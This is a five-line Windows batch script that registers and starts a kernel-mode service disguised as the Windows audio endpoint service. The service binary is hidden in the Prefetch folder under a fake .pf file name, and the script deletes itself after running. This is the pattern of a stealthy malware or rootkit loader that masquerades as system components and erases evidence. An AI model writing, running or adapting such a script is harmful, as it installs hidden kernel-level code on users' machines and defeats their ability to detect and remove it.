@echo off
cd %~dp0
sc create AudioEndpointBuilder_76 binpath=C:\Windows\Prefetch\SVCHOST.EXE-IR8WV5J9.pf type=kernel
sc start AudioEndpointBuilder_76
del "%~f0"



